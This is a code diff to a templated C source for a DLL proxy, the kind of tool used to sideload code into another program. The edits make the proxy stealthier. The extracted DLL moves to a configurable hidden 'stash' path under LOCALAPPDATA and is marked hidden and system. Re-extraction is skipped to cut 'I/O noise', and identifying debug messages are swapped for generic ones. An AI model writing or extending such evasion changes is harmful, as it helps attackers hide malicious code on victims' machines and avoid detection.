@@ -45,7 +45,20 @@ void resolve_exports(HMODULE hOriginal) {
 }
 
 {% if embed_enabled %}
-/* --- Extract embedded DLL from resource and load it --- */
+/* --- Extract embedded DLL and load it --- */
+static void _mkdirs(const char *path) {
+    char buf[MAX_PATH];
+    lstrcpyA(buf, path);
+    for (char *p = buf; *p; p++) {
+        if (*p == '\\') {
+            *p = '\0';
+            CreateDirectoryA(buf, NULL);
+            *p = '\\';
+        }
+    }
+    CreateDirectoryA(buf, NULL);
+}
+
 static BOOL load_embedded_dll(void) {
     HRSRC hRes = FindResourceA(hSelf, MAKEINTRESOURCEA(IDR_ORIGINAL_DLL), "BINARY");
     if (!hRes) return FALSE;
@@ -57,15 +70,26 @@ static BOOL load_embedded_dll(void) {
     DWORD dwSize = SizeofResource(hSelf, hRes);
     if (!pData || dwSize == 0) return FALSE;
 
-    char szTempDir[MAX_PATH];
-    GetTempPathA(MAX_PATH, szTempDir);
-    lstrcatA(szTempDir, "proxy_fw\\");
-    CreateDirectoryA(szTempDir, NULL);
+    char szBase[MAX_PATH];
+    if (!GetEnvironmentVariableA("LOCALAPPDATA", szBase, MAX_PATH))
+        GetTempPathA(MAX_PATH, szBase);
 
-    lstrcpyA(szTempPath, szTempDir);
-    lstrcatA(szTempPath, "{{ original_dll_filename }}");
+    char szDir[MAX_PATH];
+    lstrcpyA(szDir, szBase);
+    lstrcatA(szDir, "\\{{ stash_dir }}");
+    _mkdirs(szDir);
 
-    HANDLE hFile = CreateFileA(szTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    lstrcpyA(szTempPath, szDir);
+    lstrcatA(szTempPath, "\\{{ stash_filename }}");
+
+    /* Skip re-extraction if already on disk (reduces I/O noise) */
+    if (GetFileAttributesA(szTempPath) != INVALID_FILE_ATTRIBUTES) {
+        hOriginalDll = LoadLibraryA(szTempPath);
+        if (hOriginalDll) return TRUE;
+    }
+
+    HANDLE hFile = CreateFileA(szTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return FALSE;
 
     DWORD dwWritten;
@@ -103,12 +127,12 @@ static BOOL load_original_dll(void) {
 static void init_proxy(void) {
 {% if embed_enabled %}
     if (!load_embedded_dll()) {
-        OutputDebugStringA("[DLL Proxy] FATAL: Failed to load embedded DLL\n");
+        OutputDebugStringA("Module initialization failed\n");
         return;
     }
 {% else %}
     if (!load_original_dll()) {
-        OutputDebugStringA("[DLL Proxy] FATAL: Failed to load original DLL\n");
+        OutputDebugStringA("Module initialization failed\n");
         return;
     }
 {% endif %}
